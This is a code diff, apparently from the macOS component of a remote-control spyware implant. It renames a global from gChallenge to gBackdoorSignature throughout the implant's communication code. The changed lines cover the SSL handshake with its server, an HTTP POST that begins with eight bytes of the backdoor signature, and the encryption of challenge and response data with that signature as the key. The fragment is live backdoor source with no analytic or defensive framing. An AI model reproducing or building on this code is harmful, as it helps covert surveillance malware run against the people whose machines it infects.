@@ -19,7 +19,7 @@
 
 #import "NSMutableData+AES128.h"
 #import "NSString+SHA1.h"
-
+#import "NSData+SHA1.h"
 #import "RCSMCommon.h"
 
 //#define DEBUG
@@ -161,9 +161,9 @@
   
   //
   // In order to communicate on the SSL port the first command needs to be an
-  // HTTP POST with the first 8 bytes of the gChallenge (signature)
+  // HTTP POST with the first 8 bytes of the gBackdoorSignature
   //
-  NSString *_postData     = [NSString stringWithUTF8String: gChallenge];
+  NSString *_postData     = [NSString stringWithUTF8String: gBackdoorSignature];
   NSMutableData *postData = [[NSMutableData alloc] init];
   NSString *postString    = [NSString stringWithFormat: @"%@%@",
                              [_postData substringWithRange: NSMakeRange(0, 8)], SSL_FIRST_COMMAND];
@@ -817,14 +817,14 @@
 #endif
 
   NSMutableData *responseData = [[NSMutableData alloc] init];
-  NSData *temp = [NSData dataWithBytes: &gChallenge
-                                length: strlen(gChallenge)];
+  NSData *temp = [NSData dataWithBytes: &gBackdoorSignature
+                                length: strlen(gBackdoorSignature)];
   
   CCCryptorStatus success = 0;
   success = [mChallenge encryptWithKey: temp];
   
 #ifdef DEBUG
-  infoLog(ME, @"gChallenge: %@", temp);
+  infoLog(ME, @"gBackdoorSignature: %@", temp);
   infoLog(ME, @"mChallenge: %@", mChallenge);
   infoLog(ME, @"success: %d", success);
 #endif
@@ -904,11 +904,11 @@
 #endif
       // Temp Code
       //unsigned char result[CC_MD5_DIGEST_LENGTH];
-      //CC_MD5(gChallenge, strlen(gChallenge), result);
+      //CC_MD5(gBackdoorSignature, strlen(gBackdoorSignature), result);
       //NSData *temp = [NSData dataWithBytes: result length: CC_MD5_DIGEST_LENGTH];
       
-      NSData *temp = [NSData dataWithBytes: &gChallenge
-                                    length: strlen(gChallenge)];
+      NSData *temp = [NSData dataWithBytes: &gBackdoorSignature
+                                    length: strlen(gBackdoorSignature)];
       CCCryptorStatus success = 0;
       
       success = [responseData encryptWithKey: temp];
@@ -2034,8 +2034,8 @@
 #endif
       
       mChallenge = [[NSMutableData alloc] init];
-      mTempChallenge = [[NSData alloc] initWithBytes: &gChallenge
-                                              length: strlen(gChallenge)];
+      mTempChallenge = [[NSData alloc] initWithBytes: &gBackdoorSignature
+                                              length: strlen(gBackdoorSignature)];
     }
   else
     return nil;
